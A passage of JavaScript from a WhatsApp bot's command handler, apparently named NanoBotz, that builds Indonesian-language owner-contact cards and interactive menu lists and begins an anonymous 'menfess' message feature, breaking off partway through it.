        case 'totalcmd': 
        case 'totalcommand': 
            replynano(`total fitur pada :${botname}\nberjumlah: ${nanototalpitur()}`)
        break
case 'owner': {
let name = m.pushName || NanoBotz.getName(m.sender);
let pan = `
▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰
> *Halo Kak \`${name}\`, Tekan Tombol Yang bertuliskan Chat Owner Untuk Menghubungi Nomor Owner ku*
▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰
`;
const url = fs.readFileSync("./data/image/thumb.jpg")
async function image(url) {
  const { imageMessage } = await generateWAMessageContent({
    image: {
      url
    }
  }, {
    upload: NanoBotz.waUploadToServer
  });
  return imageMessage;
}
let msg = generateWAMessageFromContent(
  m.chat,
  {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          body: {
            text: pan
          },
          carouselMessage: {
            cards: [
              {
                header: proto.Message.InteractiveMessage.Header.create({
          ...(await prepareWAMessageMedia({ image: { url: './data/image/thumb.jpg' } }, { upload: NanoBotz.waUploadToServer })),
          title: ``,
          gifPlayback: true,
          subtitle: ownername,
          hasMediaAttachment: false
        }),
                body: {
                  text: `
┏───────────────┈ 
┆     「 *\`[OWNER BOT]\`* 」
┣───────────────┈ 
┣──=[ *\`[ ${global.ownername} ]\`* ]==─
┆ • Jangan Chat Yang Aneh Aneh
┆ • Jangan Telpon/Call Owner 
┆ • Chat Langsung ke intinya aja
┆ • Klo Ada Uang Minimal Bagi
└────────────┈ ⳹`
                },
                nativeFlowMessage: {
                  buttons: [
                    {
                      name: "cta_url",
                      buttonParamsJson: `{"display_text":"👤 Chat Owner ( ${global.ownername} )","url":"https://wa.me/${global.ownernumber}","merchant_url":"https://wa.me/${global.ownernumber}"}`
                    },
                  ],
                },
              },
              {
                header: proto.Message.InteractiveMessage.Header.create({
          ...(await prepareWAMessageMedia({ image: { url: './data/image/thumb.jpg' } }, { upload: NanoBotz.waUploadToServer })),
          title: ``,
          gifPlayback: true,
          subtitle: ownername,
          hasMediaAttachment: false
        }),
                body: {
                  text: `
┏───────────────┈ 
┆     「 *\`[NOMOR BOT]\`* 」
┣───────────────┈ 
┣──=[ *\`[ ${botname} ]\`* ]==─
┆ • Jangan Spam Bot
┆ • Jangan Telpon/Call Bot 
┆ • Gaudah Chat Yg Aneh Aneh
┆ • Beli Prem Dll Chat Owner
└────────────┈ ⳹`
                },
                nativeFlowMessage: {
                  buttons: [
                    {
                      name: "cta_url",
                      buttonParamsJson: `{"display_text":"  💬  Chat Bot ( ${botname} )","url":"https://wa.me/${global.botnumber}","merchant_url":"https://wa.me/${global.botnumber}"}`
                    },
                  ],
                },
              },
            ],
            messageVersion: 1,
          },
        },
      },
    },
  },
  {}
);

await NanoBotz.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id,
});

}
break
 case 'menu': {
     	       let ownernya = ownernomer + '@s.whatsapp.net'
            let me = m.sender
            let timestampe = speed()
            let latensie = speed() - timestampe
            nano_sad = `👋 *Hai ${pushname}!*
Selamat datang di *${botname}*, bot WhatsApp yang siap membantu Anda!

┌─ 📊 DASHBOARD ─┐
│
├─ ❖ Nama: ${pushname}
├─ ❖ Status User: ${isPrem ? 'premium' : 'Gratisan😹'}
├─ ❖ Mode: _${NanoBotz.public ? 'Publik' : 'Self'}_
├─ ❖ Pengguna: ${Object.keys(global.db.users).length}
│
├─ 🤖 *INFO BOT* ─┐
│
├─ ❖ Nama Bot: ${botname}
├─ ❖ Total Fitur: ${nanototalpitur()}
└─ ❖ Pengembang: ${ownername}`
            let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: nano_sad
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
    {
"name": "single_select",
        "buttonParamsJson": 
                `{
                    "title": "LIST MENU BOT",
                    "sections": [
                      {
                        "title": "${botname}",
                        "rows": [
        
        {       
          "header": "AI MENU",
          "title": "click to display",
          "description": "Displays The List Of AI Features",
          "id": ".aimenu"
        },
        {
          "header": "ANONYMOUS MENU",
          "title": "click to display",
          "description": "Displays The List Of Anonymous Features",
          "id": ".anonymousmenu"
        },
        {
          "header": "CONVERT MENU",
          "title": "click to display",
          "description": "Displays The List Of Convert Features",
          "id": ".convertmenu"
        },
        {
          "header": "DOWNLOAD MENU",
          "title": "click to display",
          "description": "Displays The List Of Convert Features",
          "id": ".downloadmenu"
        },  
        {
          "header": "EPHOTO360 MENU",
          "title": "click to display",
          "description": "Displays The List Of Ephoto360 Features",
          "id": ".ephoto360menu"
        },
        {
          "header": "FUN MENU",
          "title": "click to display",
          "description": "Displays The List Of Fun Features",
          "id": ".funmenu"
        },
        {
          "header": "GAME MENU",
          "title": "click to display",
          "description": "Displays The List Of Game Features",
          "id": ".gamemenu"
        },
        {
          "header": "GROUP MENU",
          "title": "click to display",
          "description": "Displays The List Of Group Features",
          "id": ".groupmenu"
        },
        {
          "header": "OTHER MENU",
          "title": "click to display",
          "description": "Displays The List Of Other Features",
          "id": ".othermenu"
        },
        {
          "header": "OWNER MENU",
          "title": "click to display",
          "description": "Displays The List Of Owner Features",
          "id": ".ownermenu"
        },
        {
          "header": "QUOTES MENU",
          "title": "click to display",
          "description": "Displays The List Of Quotes Features",
          "id": ".quotesmenu"
        },
        {
          "header": "RANDOM PHOTO MENU",
          "title": "click to display",
          "description": "Displays The List Of Random Photo Features",
          "id": ".randomphotomenu"
        },
        {
          "header": "RANDOM VIDEO MENU",
          "title": "click to display",
          "description": "Displays The List Of Random Video Features",
          "id": ".randomvideomenu"
        },
        {
          "header": "STALKER MENU",
          "title": "click to display",
          "description": "Displays The List Of Stalker Features",
          "id": ".stalkermenu"
        }
      ]
    }
  ]
}`

              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":".owner"}`
              }
           ],
          })
        })
    }
  }
}, {})

await NanoBotz.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
           }
           break
//=========================================\\
 
//=========================================\\
case 'allmenu': {
let nano_sad = `${allmenu(prefix, hituet)}`
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: nano_sad
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
  "name": "single_select",
"buttonParamsJson": 
`{
  "title": "LIST MENU BOT",
  "sections": [
    {
      "title": "${botname}",
      "rows": [
        
        {       
          "header": "AI MENU",
          "title": "click to display",
          "description": "Displays The List Of AI Features",
          "id": ".aimenu"
        },
        {
          "header": "ANONYMOUS MENU",
          "title": "click to display",
          "description": "Displays The List Of Anonymous Features",
          "id": ".anonymousmenu"
        },
        {
          "header": "CONVERT MENU",
          "title": "click to display",
          "description": "Displays The List Of Convert Features",
          "id": ".convertmenu"
        },
        {
          "header": "DOWNLOAD MENU",
          "title": "click to display",
          "description": "Displays The List Of Convert Features",
          "id": ".downloadmenu"
        },  
        {
          "header": "EPHOTO360 MENU",
          "title": "click to display",
          "description": "Displays The List Of Ephoto360 Features",
          "id": ".ephoto360menu"
        },
        {
          "header": "FUN MENU",
          "title": "click to display",
          "description": "Displays The List Of Fun Features",
          "id": ".funmenu"
        },
        {
          "header": "GAME MENU",
          "title": "click to display",
          "description": "Displays The List Of Game Features",
          "id": ".gamemenu"
        },
        {
          "header": "GROUP MENU",
          "title": "click to display",
          "description": "Displays The List Of Group Features",
          "id": ".groupmenu"
        },
        {
          "header": "OTHER MENU",
          "title": "click to display",
          "description": "Displays The List Of Other Features",
          "id": ".othermenu"
        },
        {
          "header": "OWNER MENU",
          "title": "click to display",
          "description": "Displays The List Of Owner Features",
          "id": ".ownermenu"
        },
        {
          "header": "QUOTES MENU",
          "title": "click to display",
          "description": "Displays The List Of Quotes Features",
          "id": ".quotesmenu"
        },
        {
          "header": "RANDOM PHOTO MENU",
          "title": "click to display",
          "description": "Displays The List Of Random Photo Features",
          "id": ".randomphotomenu"
        },
        {
          "header": "RANDOM VIDEO MENU",
          "title": "click to display",
          "description": "Displays The List Of Random Video Features",
          "id": ".randomvideomenu"
        },
        {
          "header": "STALKER MENU",
          "title": "click to display",
          "description": "Displays The List Of Stalker Features",
          "id": ".stalkermenu"
        }
      ]
    }
  ]
}`

              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":".owner"}`
              }
           ],
          })
        })
    }
  }
}, {})

await NanoBotz.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
break
case 'gamemenu': {
  let nano_sad = `${gamemenu(prefix, hituet)}`
let msg = generateWAMessageFromContent(from, {
 viewOnceMessage: {
   message: {
       "messageContextInfo": {
         "deviceListMetadata": {},
         "deviceListMetadataVersion": 2
       },
       interactiveMessage: proto.Message.InteractiveMessage.create({
         body: proto.Message.InteractiveMessage.Body.create({
           text: nano_sad
         }),
         footer: proto.Message.InteractiveMessage.Footer.create({
           text: botname
         }),
         
         nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
           buttons: [
           {
 "name": "single_select",
"buttonParamsJson": 
`{
 "title": "LIST MENU BOT",
 "sections": [
   {
     "title": "${botname}",
     "rows": [
       {       
         "header": "AI MENU",
         "title": "click to display",
         "description": "Displays The List Of AI Features",
         "id": ".aimenu"
       },
       {
         "header": "ANONYMOUS MENU",
         "title": "click to display",
         "description": "Displays The List Of Anonymous Features",
         "id": ".anonymousmenu"
       },
       {
         "header": "CONVERT MENU",
         "title": "click to display",
         "description": "Displays The List Of Convert Features",
         "id": ".convertmenu"
       },
       {
         "header": "EPHOTO360 MENU",
         "title": "click to display",
         "description": "Displays The List Of Ephoto360 Features",
         "id": ".ephoto360menu"
       },
       {
         "header": "FUN MENU",
         "title": "click to display",
         "description": "Displays The List Of Fun Features",
         "id": ".funmenu"
       },
       {
         "header": "GAME MENU",
         "title": "click to display",
         "description": "Displays The List Of Game Features",
         "id": ".gamemenu"
       },
       {
         "header": "GROUP MENU",
         "title": "click to display",
         "description": "Displays The List Of Group Features",
         "id": ".groupmenu"
       },
       {
         "header": "OTHER MENU",
         "title": "click to display",
         "description": "Displays The List Of Other Features",
         "id": ".othermenu"
       },
       {
         "header": "OWNER MENU",
         "title": "click to display",
         "description": "Displays The List Of Owner Features",
         "id": ".ownermenu"
       },
       {
         "header": "QUOTES MENU",
         "title": "click to display",
         "description": "Displays The List Of Quotes Features",
         "id": ".quotesmenu"
       },
       {
         "header": "RANDOM PHOTO MENU",
         "title": "click to display",
         "description": "Displays The List Of Random Photo Features",
         "id": ".randomphotomenu"
       },
       {
         "header": "RANDOM VIDEO MENU",
         "title": "click to display",
         "description": "Displays The List Of Random Video Features",
         "id": ".randomvideomenu"
       },
       {
         "header": "STALKER MENU",
         "title": "click to display",
         "description": "Displays The List Of Stalker Features",
         "id": ".stalkermenu"
       }
     ]
   }
 ]
}`

             },
             {
               "name": "quick_reply",
               "buttonParamsJson": `{"display_text":"Owner 👤","id":".owner"}`
             }
          ],
         })
       })
   }
 }
}, {})

await NanoBotz.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})
}
break

case 'convertmenu': {
   let nano_sad = `${convertmenu(prefix, hituet)}`
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: nano_sad
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
            {
  "name": "single_select",
"buttonParamsJson": 
`{
  "title": "LIST MENU BOT",
  "sections": [
    {
      "title": "${botname}",
      "rows": [
        {       
          "header": "AI MENU",
          "title": "click to display",
          "description": "Displays The List Of AI Features",
          "id": ".aimenu"
        },
        {
          "header": "ANONYMOUS MENU",
          "title": "click to display",
          "description": "Displays The List Of Anonymous Features",
          "id": ".anonymousmenu"
        },
        {
          "header": "CONVERT MENU",
          "title": "click to display",
          "description": "Displays The List Of Convert Features",
          "id": ".convertmenu"
        },
        {
          "header": "DOWNLOAD MENU",
          "title": "click to display",
          "description": "Displays The List Of Convert Features",
          "id": ".downloadmenu"
        },  
        {
          "header": "EPHOTO360 MENU",
          "title": "click to display",
          "description": "Displays The List Of Ephoto360 Features",
          "id": ".ephoto360menu"
        },
        {
          "header": "FUN MENU",
          "title": "click to display",
          "description": "Displays The List Of Fun Features",
          "id": ".funmenu"
        },
        {
          "header": "GAME MENU",
          "title": "click to display",
          "description": "Displays The List Of Game Features",
          "id": ".gamemenu"
        },
        {
          "header": "GROUP MENU",
          "title": "click to display",
          "description": "Displays The List Of Group Features",
          "id": ".groupmenu"
        },
        {
          "header": "OTHER MENU",
          "title": "click to display",
          "description": "Displays The List Of Other Features",
          "id": ".othermenu"
        },
        {
          "header": "OWNER MENU",
          "title": "click to display",
          "description": "Displays The List Of Owner Features",
          "id": ".ownermenu"
        },
        {
          "header": "QUOTES MENU",
          "title": "click to display",
          "description": "Displays The List Of Quotes Features",
          "id": ".quotesmenu"
        },
        {
          "header": "RANDOM PHOTO MENU",
          "title": "click to display",
          "description": "Displays The List Of Random Photo Features",
          "id": ".randomphotomenu"
        },
        {
          "header": "RANDOM VIDEO MENU",
          "title": "click to display",
          "description": "Displays The List Of Random Video Features",
          "id": ".randomvideomenu"
        },
        {
          "header": "STALKER MENU",
          "title": "click to display",
          "description": "Displays The List Of Stalker Features",
          "id": ".stalkermenu"
        }
      ]
    }
  ]
}`

              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":".owner"}`
              }
           ],
          })
        })
    }
  }
}, {})

await NanoBotz.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
break
//=========================================\\
case 'quotesmenu': {
  let nano_sad = `${quotesmenu(prefix, hituet)}`
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: nano_sad
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
            {
  "name": "single_select",
"buttonParamsJson": 
`{
  "title": "LIST MENU BOT",
  "sections": [
    {
      "title": "${botname}",
      "rows": [
        
        {       
          "header": "AI MENU",
          "title": "click to display",
          "description": "Displays The List Of AI Features",
          "id": ".aimenu"
        },
        {
          "header": "ANONYMOUS MENU",
          "title": "click to display",
          "description": "Displays The List Of Anonymous Features",
          "id": ".anonymousmenu"
        },
        {
          "header": "CONVERT MENU",
          "title": "click to display",
          "description": "Displays The List Of Convert Features",
          "id": ".convertmenu"
        },
        {
          "header": "DOWNLOAD MENU",
          "title": "click to display",
          "description": "Displays The List Of Convert Features",
          "id": ".downloadmenu"
        },  
        {
          "header": "EPHOTO360 MENU",
          "title": "click to display",
          "description": "Displays The List Of Ephoto360 Features",
          "id": ".ephoto360menu"
        },
        {
          "header": "FUN MENU",
          "title": "click to display",
          "description": "Displays The List Of Fun Features",
          "id": ".funmenu"
        },
        {
          "header": "GAME MENU",
          "title": "click to display",
          "description": "Displays The List Of Game Features",
          "id": ".gamemenu"
        },
        {
          "header": "GROUP MENU",
          "title": "click to display",
          "description": "Displays The List Of Group Features",
          "id": ".groupmenu"
        },
        {
          "header": "OTHER MENU",
          "title": "click to display",
          "description": "Displays The List Of Other Features",
          "id": ".othermenu"
        },
        {
          "header": "OWNER MENU",
          "title": "click to display",
          "description": "Displays The List Of Owner Features",
          "id": ".ownermenu"
        },
        {
          "header": "QUOTES MENU",
          "title": "click to display",
          "description": "Displays The List Of Quotes Features",
          "id": ".quotesmenu"
        },
        {
          "header": "RANDOM PHOTO MENU",
          "title": "click to display",
          "description": "Displays The List Of Random Photo Features",
          "id": ".randomphotomenu"
        },
        {
          "header": "RANDOM VIDEO MENU",
          "title": "click to display",
          "description": "Displays The List Of Random Video Features",
          "id": ".randomvideomenu"
        },
        {
          "header": "STALKER MENU",
          "title": "click to display",
          "description": "Displays The List Of Stalker Features",
          "id": ".stalkermenu"
        }
      ]
    }
  ]
}`

              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":".owner"}`
              }
           ],
          })
        })
    }
  }
}, {})

await NanoBotz.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
break
//=========================================\\
case 'anonymousmenu': {
  let nano_sad = `${anonymousmenu(prefix, hituet)}`
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: nano_sad
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
            {
  "name": "single_select",
"buttonParamsJson": 
`{
  "title": "LIST MENU BOT",
  "sections": [
    {
      "title": "${botname}",
      "rows": [
        
        {       
          "header": "AI MENU",
          "title": "click to display",
          "description": "Displays The List Of AI Features",
          "id": ".aimenu"
        },
        {
          "header": "ANONYMOUS MENU",
          "title": "click to display",
          "description": "Displays The List Of Anonymous Features",
          "id": ".anonymousmenu"
        },
        {
          "header": "CONVERT MENU",
          "title": "click to display",
          "description": "Displays The List Of Convert Features",
          "id": ".convertmenu"
        },
        {
          "header": "DOWNLOAD MENU",
          "title": "click to display",
          "description": "Displays The List Of Convert Features",
          "id": ".downloadmenu"
        },  
        {
          "header": "EPHOTO360 MENU",
          "title": "click to display",
          "description": "Displays The List Of Ephoto360 Features",
          "id": ".ephoto360menu"
        },
        {
          "header": "FUN MENU",
          "title": "click to display",
          "description": "Displays The List Of Fun Features",
          "id": ".funmenu"
        },
        {
          "header": "GAME MENU",
          "title": "click to display",
          "description": "Displays The List Of Game Features",
          "id": ".gamemenu"
        },
        {
          "header": "GROUP MENU",
          "title": "click to display",
          "description": "Displays The List Of Group Features",
          "id": ".groupmenu"
        },
        {
          "header": "OTHER MENU",
          "title": "click to display",
          "description": "Displays The List Of Other Features",
          "id": ".othermenu"
        },
        {
          "header": "OWNER MENU",
          "title": "click to display",
          "description": "Displays The List Of Owner Features",
          "id": ".ownermenu"
        },
        {
          "header": "QUOTES MENU",
          "title": "click to display",
          "description": "Displays The List Of Quotes Features",
          "id": ".quotesmenu"
        },
        {
          "header": "RANDOM PHOTO MENU",
          "title": "click to display",
          "description": "Displays The List Of Random Photo Features",
          "id": ".randomphotomenu"
        },
        {
          "header": "RANDOM VIDEO MENU",
          "title": "click to display",
          "description": "Displays The List Of Random Video Features",
          "id": ".randomvideomenu"
        },
        {
          "header": "STALKER MENU",
          "title": "click to display",
          "description": "Displays The List Of Stalker Features",
          "id": ".stalkermenu"
        }
      ]
    }
  ]
}`

              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":".owner"}`
              }
           ],
          })
        })
    }
  }
}, {})

await NanoBotz.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
break
//=========================================\\

case 'ownermenu': {
  let nano_sad = `${ ownermenu(prefix, hituet)}`
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: nano_sad
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
            {
  "name": "single_select",
"buttonParamsJson": 
`{
  "title": "LIST MENU BOT",
  "sections": [
    {
      "title": "${botname}",
      "rows": [
        
        {       
          "header": "AI MENU",
          "title": "click to display",
          "description": "Displays The List Of AI Features",
          "id": ".aimenu"
        },
        {
          "header": "ANONYMOUS MENU",
          "title": "click to display",
          "description": "Displays The List Of Anonymous Features",
          "id": ".anonymousmenu"
        },
        {
          "header": "CONVERT MENU",
          "title": "click to display",
          "description": "Displays The List Of Convert Features",
          "id": ".convertmenu"
        },
        {
          "header": "DOWNLOAD MENU",
          "title": "click to display",
          "description": "Displays The List Of Convert Features",
          "id": ".downloadmenu"
        },  
        {
          "header": "EPHOTO360 MENU",
          "title": "click to display",
          "description": "Displays The List Of Ephoto360 Features",
          "id": ".ephoto360menu"
        },
        {
          "header": "FUN MENU",
          "title": "click to display",
          "description": "Displays The List Of Fun Features",
          "id": ".funmenu"
        },
        {
          "header": "GAME MENU",
          "title": "click to display",
          "description": "Displays The List Of Game Features",
          "id": ".gamemenu"
        },
        {
          "header": "GROUP MENU",
          "title": "click to display",
          "description": "Displays The List Of Group Features",
          "id": ".groupmenu"
        },
        {
          "header": "OTHER MENU",
          "title": "click to display",
          "description": "Displays The List Of Other Features",
          "id": ".othermenu"
        },
        {
          "header": "OWNER MENU",
          "title": "click to display",
          "description": "Displays The List Of Owner Features",
          "id": ".ownermenu"
        },
        {
          "header": "QUOTES MENU",
          "title": "click to display",
          "description": "Displays The List Of Quotes Features",
          "id": ".quotesmenu"
        },
        {
          "header": "RANDOM PHOTO MENU",
          "title": "click to display",
          "description": "Displays The List Of Random Photo Features",
          "id": ".randomphotomenu"
        },
        {
          "header": "RANDOM VIDEO MENU",
          "title": "click to display",
          "description": "Displays The List Of Random Video Features",
          "id": ".randomvideomenu"
        },
        {
          "header": "STALKER MENU",
          "title": "click to display",
          "description": "Displays The List Of Stalker Features",
          "id": ".stalkermenu"
        }
      ]
    }
  ]
}`

              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":".owner"}`
              }
           ],
          })
        })
    }
  }
}, {})

await NanoBotz.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
break
case 'othermenu': {
  let nano_sad = `${othermenu(prefix, hituet)}`
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: nano_sad
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
            {
  "name": "single_select",
"buttonParamsJson": 
`{
  "title": "LIST MENU BOT",
  "sections": [
    {
      "title": "${botname}",
      "rows": [
        
        {       
          "header": "AI MENU",
          "title": "click to display",
          "description": "Displays The List Of AI Features",
          "id": ".aimenu"
        },
        {
          "header": "ANONYMOUS MENU",
          "title": "click to display",
          "description": "Displays The List Of Anonymous Features",
          "id": ".anonymousmenu"
        },
        {
          "header": "CONVERT MENU",
          "title": "click to display",
          "description": "Displays The List Of Convert Features",
          "id": ".convertmenu"
        },
        {
          "header": "DOWNLOAD MENU",
          "title": "click to display",
          "description": "Displays The List Of Convert Features",
          "id": ".downloadmenu"
        },  
        {
          "header": "EPHOTO360 MENU",
          "title": "click to display",
          "description": "Displays The List Of Ephoto360 Features",
          "id": ".ephoto360menu"
        },
        {
          "header": "FUN MENU",
          "title": "click to display",
          "description": "Displays The List Of Fun Features",
          "id": ".funmenu"
        },
        {
          "header": "GAME MENU",
          "title": "click to display",
          "description": "Displays The List Of Game Features",
          "id": ".gamemenu"
        },
        {
          "header": "GROUP MENU",
          "title": "click to display",
          "description": "Displays The List Of Group Features",
          "id": ".groupmenu"
        },
        {
          "header": "OTHER MENU",
          "title": "click to display",
          "description": "Displays The List Of Other Features",
          "id": ".othermenu"
        },
        {
          "header": "OWNER MENU",
          "title": "click to display",
          "description": "Displays The List Of Owner Features",
          "id": ".ownermenu"
        },
        {
          "header": "QUOTES MENU",
          "title": "click to display",
          "description": "Displays The List Of Quotes Features",
          "id": ".quotesmenu"
        },
        {
          "header": "RANDOM PHOTO MENU",
          "title": "click to display",
          "description": "Displays The List Of Random Photo Features",
          "id": ".randomphotomenu"
        },
        {
          "header": "RANDOM VIDEO MENU",
          "title": "click to display",
          "description": "Displays The List Of Random Video Features",
          "id": ".randomvideomenu"
        },
        {
          "header": "STALKER MENU",
          "title": "click to display",
          "description": "Displays The List Of Stalker Features",
          "id": ".stalkermenu"
        }
      ]
    }
  ]
}`

              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":".owner"}`
              }
           ],
          })
        })
    }
  }
}, {})

await NanoBotz.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
break
case 'downloadmenu': { 
let nano_sad = `${downloadmenu(prefix, hituet)}`  
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: nano_sad
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
            {
  "name": "single_select",
"buttonParamsJson": 
`{
  "title": "LIST MENU BOT",
  "sections": [
    {
      "title": "${botname}",
      "rows": [
        
        {       
          "header": "AI MENU",
          "title": "click to display",
          "description": "Displays The List Of AI Features",
          "id": ".aimenu"
        },
        {
          "header": "ANONYMOUS MENU",
          "title": "click to display",
          "description": "Displays The List Of Anonymous Features",
          "id": ".anonymousmenu"
        },
        {
          "header": "CONVERT MENU",
          "title": "click to display",
          "description": "Displays The List Of Convert Features",
          "id": ".convertmenu"
        },
        {
          "header": "DOWNLOAD MENU",
          "title": "click to display",
          "description": "Displays The List Of Convert Features",
          "id": ".downloadmenu"
        },  
        {
          "header": "EPHOTO360 MENU",
          "title": "click to display",
          "description": "Displays The List Of Ephoto360 Features",
          "id": ".ephoto360menu"
        },
        {
          "header": "FUN MENU",
          "title": "click to display",
          "description": "Displays The List Of Fun Features",
          "id": ".funmenu"
        },
        {
          "header": "GAME MENU",
          "title": "click to display",
          "description": "Displays The List Of Game Features",
          "id": ".gamemenu"
        },
        {
          "header": "GROUP MENU",
          "title": "click to display",
          "description": "Displays The List Of Group Features",
          "id": ".groupmenu"
        },
        {
          "header": "OTHER MENU",
          "title": "click to display",
          "description": "Displays The List Of Other Features",
          "id": ".othermenu"
        },
        {
          "header": "OWNER MENU",
          "title": "click to display",
          "description": "Displays The List Of Owner Features",
          "id": ".ownermenu"
        },
        {
          "header": "QUOTES MENU",
          "title": "click to display",
          "description": "Displays The List Of Quotes Features",
          "id": ".quotesmenu"
        },
        {
          "header": "RANDOM PHOTO MENU",
          "title": "click to display",
          "description": "Displays The List Of Random Photo Features",
          "id": ".randomphotomenu"
        },
        {
          "header": "RANDOM VIDEO MENU",
          "title": "click to display",
          "description": "Displays The List Of Random Video Features",
          "id": ".randomvideomenu"
        },
        {
          "header": "STALKER MENU",
          "title": "click to display",
          "description": "Displays The List Of Stalker Features",
          "id": ".stalkermenu"
        }
      ]
    }
  ]
}`

              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":".owner"}`
              }
           ],
          })
        })
    }
  }
}, {})

await NanoBotz.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
break

case 'confess': case 'confes': case 'menfes': case 'menfess':{
NanoBotz.menfes = NanoBotz.menfes ? NanoBotz.menfes : {}
roof = Object.values(NanoBotz.menfes).find(menpes => [menpes.a, menpes.b].includes(m.sender))
if (roof) return reply("Kamu masih berada dalam sesi menfess")
if (m.isGroup) return reply('Fitur Khusus Di private chat!')
if (!text) return reply(`Kirim Perintah ${prefix + command} nama|nomor|pesan\n\nContoh :\n${prefix + command} ${pushname}|628xxx|Menfes nih\n`)
if (!text.includes('|')) return reply(`Kirim Perintah ${prefix + command} nama|nomor|pesan\n\nContoh :\n${prefix + command} ${pushname}|6292818802718|Menfes nih\n`)
let [namaNya, nomorNya, pesanNya] = text.split`|`
if (nomorNya.startsWith('0')) return reply(`Kirim Perintah ${prefix + command} nama|nomor|pesan\n\nContoh :\n${prefix + command} ${pushname}|628xxx|Menfes nih\n`)
if(isNaN(nomorNya)) return reply(`Kirim Perintah ${prefix + command} nama|nomor|pesan\n\nContoh :\n${prefix + command} ${pushname}|628xxx|Menfes nih\n`)
var yoi = `Hi ada menfess nih buat kamu\n\nDari : ${namaNya}\nPesan : ${pesanNya}\n\nSilahkan ketik ${prefix}balasmenfess -- Untuk menerima menfess/confess\nSilahkan ketik ${prefix}tolakmenfess -- Untuk menolak menfess/confess\n\n_Pesan ini di tulis oleh seseorang pengguna bot, bot hanya menyampaikan saja_`
let tod = await getBuffer('https://telegra.ph/file/c8fdfc8426f5f60b48cca.jpg') 
let id = m.sender
